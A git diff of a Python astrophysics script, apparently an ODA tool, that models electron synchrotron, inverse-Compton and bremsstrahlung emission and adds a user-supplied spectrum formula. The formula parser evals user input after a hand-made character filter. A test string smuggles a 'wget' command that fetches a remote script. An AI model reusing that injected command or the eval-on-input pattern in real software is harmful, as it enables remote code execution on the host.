@@ -3,13 +3,16 @@
 
 # flake8: noqa
 
+import copy
 import json
 import os
+import re
 import shutil
 
 import matplotlib.pyplot as plt
 import numpy as np
 from numpy import exp, log, log10, pi, sqrt
+from oda_api.api import ProgressReporter
 from oda_api.json import CustomJSONEncoder
 
 # ////////////////////////////////////////////////////////////////////////
@@ -21,14 +24,20 @@ from oda_api.json import CustomJSONEncoder
 # // Based on Blumenthal&Gould Rev. Mod. Phys. 42, 237 (1970) [BG]
 # ////////////////////////////////////////////////////////////////////////
 
-Gamma_inj = 2.0  # http://odahub.io/ontology#Float ; oda:label "electron injection spectrum powerlaw index"
-Ecut = 3e13  # http://odahub.io/ontology#Float ; oda:label "electron injeciton spectrum cut-off"
+pr = ProgressReporter()
 
+dN_dE = "2.0e-11*pow(E/1e13, -1.99)*exp(-E/1e13)"  # http://odahub.io/ontology#String ; oda:label "Electron spectrum dN/dE"
+
+Emin = 1e-10  # http://odahub.io/ontology#Energy_eV ; oda:label "minimal energy for calculations [eV]"
+Emax = 1e15  # http://odahub.io/ontology#Energy_eV ; oda:label "maximal energy for calculations [eV]"
 B = 3e-6  # http://odahub.io/ontology#Float ; oda:label "magnetic field [G]"
 n = 1.0e-1  # http://odahub.io/ontology#Float ; oda:label "density of the medium [1/cm3]"
 Z = 1.4  # http://odahub.io/ontology#Float ; oda:label "average atomic charge of the medium"
 T = 2.73  # http://odahub.io/ontology#Float ; oda:label "Temperature of black body photon background [K]"
 Back_norm = 1.0  # http://odahub.io/ontology#Float ; oda:label "Normalization of blackbody photon background (<=1)"
+# backgr_dN_dE = "E**2/(exp(E/(8.6e-5*2.73))-1)/3.14**2/(2e-5)**3" # http://odahub.io/ontology#String ; oda:label "Custom background spectral energy density [1/(eV cm3)]"
+backgr_dN_dE = ""  # http://odahub.io/ontology#String ; oda:label "Custom background spectral energy density [1/(eV cm3)]"
+backgr_file = ""  # oda:POSIXPath ; oda:label "Background spectrum npy file [1/(eV cm3)] (overrides parameters above)"
 
 _galaxy_wd = os.getcwd()
 
@@ -39,48 +48,83 @@ if "_data_product" in inp_dic.keys():
 else:
     inp_pdic = inp_dic
 
-for _vn in ["Gamma_inj", "Ecut", "B", "n", "Z", "T", "Back_norm"]:
+for _vn in [
+    "dN_dE",
+    "Emin",
+    "Emax",
+    "B",
+    "n",
+    "Z",
+    "T",
+    "Back_norm",
+    "backgr_dN_dE",
+    "backgr_file",
+]:
     globals()[_vn] = type(globals()[_vn])(inp_pdic[_vn])
+
+def parse_spectrum(input_str):
+    dnde_str = copy.copy(input_str)
+
+    funcs = re.findall(r"\b\w+(?=\()", input_str)
+    for func in funcs:
+        input_str = input_str.replace(func, "")
+
+    service_symbols = "E()[]*/.,+-e "
+
+    for symbol in service_symbols:
+        input_str = input_str.replace(symbol, "")
+
+    numbers = re.findall(r"-?\d+\.?\d*(?:[eE][+-]?\d+)?", input_str)
+
+    for num in numbers:
+        input_str = input_str.replace(num, "")
+
+    if input_str:
+        raise ValueError("forbidden statements")
+
+    return eval(f"lambda E: {dnde_str}")
+
+test_str = "2.0e-11*pow(E/1000., -1.99)*exp(-E/100); !wget https://scripts.com/myscript.sh"
+# Assumed = parse_spectrum(test_str)
+Assumed = parse_spectrum(dN_dE)
+if len(backgr_dN_dE) > 0:
+    Assumed_backgr = parse_spectrum(backgr_dN_dE)
 
 # constants
 m_e = 5.1e5  # electron mass [eV]
-BeV = 7.0e-2  # Gauss-to-eV2 conversion factor
 c = 3.0e10  # speed of light
-e = 0.085  # electron charge in natural system
 hbar = 6.6e-16  # Planck constant in eV-s
 eV_cm = hbar * c  # hbar*c
 sigma_T = 6.6e-25  # Thomson cross-seciton
 alpha = 0.007299  # fine structure constant
 
-Norm = 1.0  # normalization of the electron spectrum
-# in principle, dN_e/dE is in [1/cm3/eV]
+# CGS units, Kolb-Turner, "The Early Universe", Appendix A
+BeV = sqrt(1.9084e-40 * 1e9**4 * 8 * pi)  # Gauss-to-eV2 conversion factor
+e = 0.085  # electron charge in natural system
 
 # Energy binning parameters
-Emin = 1.0e-10  # maximum of the energy range
-Emax = 10 ** (int(log10(Ecut)) + 2)  # minimum of the energy range
-print(int(log10(Ecut)), log10(Emax))
 Ndec = 10  # number of energy bins per decade;
 NEbins = int((log10(Emax) - log10(Emin)) * Ndec)
 print(NEbins)
-
-# Determine the energy binning
 energy = np.logspace(log10(Emin), log10(Emax), NEbins)
-# bin in which E=m_e and bin in which
-# Coulomb los ceases to dominate over bremsstrahlung
-for i in range(NEbins):
-    if (energy[i] >= m_e) & (energy[i - 1] < m_e):
-        j_me = i
-    if (energy[i] >= 3.5e8) & (energy[i - 1] < 3.5e8):
-        j_brems = i
-print(j_me, j_brems)
+
+# Energy at which the Coulomb los ceases to dominate over bremsstrahlung
+m = energy < 3.5e8
+j_brems = sum(m)
+
+m = energy < m_e
+j_me = sum(m)
 
 # electron injection spectrum, set by hands
-electrons = (
-    Norm
-    * (energy / m_e) ** (-Gamma_inj)
-    * exp(-energy / Ecut)
-    * (energy > m_e)
-)
+electrons = Assumed(energy)
+plt.plot(energy, electrons * energy**2)
+plt.xscale("log")
+plt.yscale("log")
+maxspec = 2 * max(electrons * energy**2)
+plt.ylim(maxspec / 1e5, maxspec)
+np.savetxt("electrons.txt", np.transpose(np.array([energy, electrons])))
+
+pr.report_progress(stage="synchrotron", progress=10)
 
 # Synchrotron emissivity
 def Fsynch(E, E_e, B):
@@ -101,7 +145,6 @@ def integrate(arr, ind1, ind2):
     arr_mean = sqrt(arr[1:] * arr[:-1])
     return sum(arr_mean[ind1:ind2] * d_energy[ind1:ind2])
 
-# Spectrum of "direct" emission from the freshly injected electrons
 # synchrotron emission
 
 synch = np.zeros(NEbins)
@@ -115,13 +158,25 @@ for i in range(NEbins):
     # synch[i] in 1/cm3/s
     synch[i] = integrate(synch1, 1, -1)
 
+pr.report_progress(stage="inverse Compton", progress=20)
+
 # thermal emission spectrum
 def Thermal(ee, T):
     T_eV = 8.6e-5 * T  # temperature in eV
     # thermal spectrum BG (2.58) [1/eV/cm3]
     return ee**2 / (exp(ee / T_eV) - 1) / pi**2 / (hbar * c) ** 3
 
-backgr = energy * Back_norm * Thermal(energy, T)
+if len(backgr_file) > 0:
+    d = np.genfromtxt(backgr_file)
+    ee = d[:, 0]
+    ff = d[:, 1]
+    plt.plot(ee, ee * ff)
+    backgr = energy * np.interp(energy, ee, ff)
+elif len(backgr_dN_dE) > 0:
+    backgr = energy * Assumed_backgr(energy)
+else:
+    backgr = energy * Back_norm * Thermal(energy, T)
+
 plt.plot(energy, backgr)
 plt.ylim(max(backgr) / 1e3, max(backgr) * 2)
 plt.xlim(energy[np.argmax(backgr)] / 100, energy[np.argmax(backgr)] * 100)
@@ -130,6 +185,7 @@ plt.yscale("log")
 plt.xlabel("$E$, eV")
 plt.ylabel("$E\cdot dn/dE$, 1/cm$^3$")
 print(integrate(backgr, 1, -1))
+np.savetxt("background.txt", np.transpose(np.array([energy, backgr / energy])))
 
 print("    Photon background ")
 backgr = energy * Back_norm * Thermal(energy, T)
@@ -163,6 +219,9 @@ def Fics(k, l, m):
 # Inverse Compton emission
 ics = np.zeros(NEbins)
 for i in range(NEbins):
+    pr.report_progress(
+        stage="inverse Compton", progress=20 + int(50 * (i / NEbins))
+    )
     compton = np.zeros(NEbins)
     for j in range(i, NEbins):
         compton1 = np.zeros(NEbins)
@@ -174,6 +233,8 @@ for i in range(NEbins):
         compton[j] = electrons[j] * integrate(compton1, 1, -1) / energy[j]
     # integration over gamma in BG (2.61) [1/cm3/s]
     ics[i] = integrate(compton, 1, -1)
+
+pr.report_progress(stage="Bremsstrahlung", progress=70)
 
 # bremsstrahlung emissivity
 def Fbrems(E, E_e):
@@ -207,6 +268,8 @@ for i in range(NEbins):
     # integration over electron energies [1/s/cm3]
     brems[i] = energy[i] * integrate(brems1 * (brems1 > 0), 1, -1)
 
+pr.report_progress(stage="Data products", progress=90)
+
 factor = max(max(synch * energy), max(ics * energy), max(brems * energy))
 plt.plot(energy, synch * energy / factor, color="black", label="synchrotron")
 plt.plot(
@@ -232,7 +295,7 @@ m = (
 # plt.xlim(energy[m][0],energy[m][-1])
 plt.legend(loc="lower right")
 plt.xlabel("Energy, eV")
-plt.ylabel("Flux, erg/(cm$^2$s)")
+plt.ylabel("$E^2 dN/dE$ (arbitrary units)")
 plt.savefig("Spectrum.png", format="png", bbox_inches="tight")
 
 from oda_api.data_products import ODAAstropyTable, PictureProduct
@@ -252,6 +315,8 @@ spec = ODAAstropyTable(Table(data, names=names))
 
 spectrum_png = bin_image  # http://odahub.io/ontology#ODAPictureProduct
 spectrum_table = spec  # http://odahub.io/ontology#ODAAstropyTable
+
+pr.report_progress(stage="Finished", progress=100)
 
 # output gathering
 _galaxy_meta_data = {}
